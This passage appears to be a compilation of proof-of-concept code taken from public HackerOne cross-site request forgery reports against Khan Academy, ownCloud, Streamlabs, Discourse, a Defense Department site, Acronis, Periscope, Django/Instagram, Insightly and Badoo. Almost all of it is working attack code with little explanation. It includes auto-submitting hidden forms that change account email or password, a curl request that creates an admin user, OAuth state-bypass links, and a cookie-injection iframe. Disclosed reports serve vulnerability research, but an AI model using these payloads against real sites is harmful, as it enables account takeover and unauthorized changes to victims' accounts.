        <title>Khan Academy Signup Email CSRF PoC</title>
        <style type="text/css">
        body {
            display:flex;
            flex-direction:column;
            justify-content:center;
            min-height:100vh;
            margin:0;
        }
        p {
            display:flex;
            align-self:center;
            font-size:0.8rem;
            font-family:sans-serif;
            font-weight:bold;
            text-transform:uppercase;
            letter-spacing:0.1rem;
        }
        </style>
    </head>
    <body>
        <p>Khan Academy Signup Email CSRF PoC</p>
        <script type="text/javascript">
            window.addEventListener('load', function(e) {
                var attacker_addr = 'attacker@rapidlight.io';
                var x = new XMLHttpRequest();
                x.open('POST', 'https://www.khanacademy.org/signup/email', true);
                x.withCredentials = true;
                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                x.send('email=' + encodeURIComponent(attacker_addr));
            }, false);
        </script>
    </body>
```

## #2041007 Cross-Site Request Forgery  — owncloud — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2023/2041007.md` (https://hackerone.com/reports/2041007)

```
curl 'http://localhost:8080/settings/users/users' \
  -H 'Accept: */*' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Cookie: oc_sessionPassphrase=<placeholder1>; oclt1tejv3yd=<placeholder2>' \
  -H 'Origin: http://abc:8080' \
  --data-raw 'username=new_admin&groups%5B%5D=admin&password=a&email=test%40mail.com' \
  --compressed
```

## #1046630 One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com — logitech — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2021/1046630.md` (https://hackerone.com/reports/1046630)

```
<html>
<head>
<style>
h1 {text-align: center;}
p {text-align: center;}
div {text-align: center;}
</style>
</head>
<body>
<h1>One Click Account Takeover PoC By C0nquer0rs</h1>
<p>Click the button to go to the Streamlabs and check you're account settings.</p>
<h1><button onclick="document.location='https://streamlabs.com/auth?code=e5p67p5r6vjizvpl2fj756625zv8ra&scope=user_read&state=b33a75be1737978b4c5ea22f7bf53078c86256db-merge%00'">Click Me</button><h1>
</body>
</html>
```

```
      from burp suite and drop that request. (We dropped this request in order not to consume the code as it can be used only once)
```

## #423022 Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account — discourse — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2018/423022.md` (https://hackerone.com/reports/423022)

```
GET /auth/yahoo/callback?_method=post&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=id_res&openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost&openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.realm=https%3A%2F%2Ftry.discourse.org&openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&openid.ax.mode=fetch_response&openid.ax.value.email=testhackeroneay%40yahoo.com&openid.ax.value.fullname=test%20hackerone&openid.ax.value.nickname=test&openid.assoc_handle=abcd&openid.response_nonce=2018-10-12T16%3A27%defg-&openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist&openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth&openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&openid.pape.auth_level.nist=0&openid.sig=9p%2Bxyz HTTP/1.1
Host: try.discourse.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

Steps to reproduce:
```

## #2699029 CSRF leads to Account takeover — deptofdefense — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2024/2699029.md` (https://hackerone.com/reports/2699029)

```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://████████/account/profile/edit" method="POST">

      <input type="hidden" name="username" value="hacker" />

      <input type="hidden" name="password" value="" />

      <input type="hidden" name="cpassword" value="" />

      <input type="hidden" name="email" value="mojejas248&#64;esterace&#46;com" />

      <input type="hidden" name="save" value="Save" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>
```

```
    <form action="https://████████/account/profile/edit" method="POST">
```

```
      <input type="hidden" name="username" value="hacker" />
```

## #709537 Delete any user's added Email,Telephone,Fax,Address,Skype via csrf in (https://academy.acronis.com/) — acronis — - — None
Source: `hackerone/reports/2023/709537.md` (https://hackerone.com/reports/709537)

```
<html>
  <body>
    <form action="https://academy.acronis.com/account/delete-contact/contact_id/<your_id>">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

```
    <form action="https://academy.acronis.com/account/delete-contact/contact_id/<your_id>">
      <input type="submit" value="Submit request" />
    </form>
```

## #215381 CSRF on Periscope Web OAuth authorization endpoint  — x — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2017/215381.md` (https://hackerone.com/reports/215381)

```
POST https://www.periscope.tv/oauthAuthorize HTTP/1.1
Host: www.periscope.tv
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sid=[...]

client_id=████&redirect_uri=https%3A%2F%2Fgetmevo.com%2Foauth%2Fperiscope?abc
```

## #26647 CSRF protection bypass on any Django powered site via Google Analytics — django — - — None
Source: `hackerone/reports/2016/26647.md` (https://hackerone.com/reports/26647)

```
>>> from http import cookies
>>> C = cookies.SimpleCookie()
>>> C.load('__utmz=blah]csrftoken=x')
>>> C
<SimpleCookie: csrftoken='x'>
```

```
<form 
action="http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed" 
id="csrf" 
method="POST">
      <input type="hidden" name="csrfmiddlewaretoken" value="x" />
      <input type="submit" value="Submit request" />
</form>

<script>
      function xxx() {
        document.getElementById('csrf').submit();
      }
</script>

<iframe 
onload="xxx()" 
src="http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/"/>
```

```
      <input type="hidden" name="csrfmiddlewaretoken" value="x" />
      <input type="submit" value="Submit request" />
```

## #1668489 CSRF vulnerability allows disabling Gmail contacts link for user referrals — insightly — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2025/1668489.md` (https://hackerone.com/reports/1668489)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://crm.na1.insightly.com/Users/GoogleDisable/2026462">
      <input type="hidden" name="&#95;pjax" value="&#35;main" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

```
    <form action="https://crm.na1.insightly.com/Users/GoogleDisable/2026462">
      <input type="hidden" name="&#95;pjax" value="&#35;main" />
      <input type="submit" value="Submit request" />
    </form>
```

## #2712857 CSRF leads to Account takeover — deptofdefense — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2024/2712857.md` (https://hackerone.com/reports/2712857)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://████████/account/profile/edit" method="POST">
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="password" value="" />
      <input type="hidden" name="cpassword" value="" />
      <input type="hidden" name="email" value="rahes53167&#64;esterace&#46;com" />
      <input type="hidden" name="save" value="Save" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

```
    <form action="https://████████/account/profile/edit" method="POST">
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="password" value="" />
      <input type="hidden" name="cpassword" value="" />
      <input type="hidden" name="email" value="rahes53167&#64;esterace&#46;com" />
      <input type="hidden" name="save" value="Save" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
```

## #127703 [CRITICAL] Full account takeover using CSRF — bumble — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2016/127703.md` (https://hackerone.com/reports/127703)

```
var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';
```

```
<html>
<head>
<title>Badoo account take over</title>
<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function getCSRFcode(str) {
    return str.split('=')[2];
}
window.onload = function(){
var csrf_code = getCSRFcode(url_stats);
csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;
window.location = csrf_url;
};
</script>
```

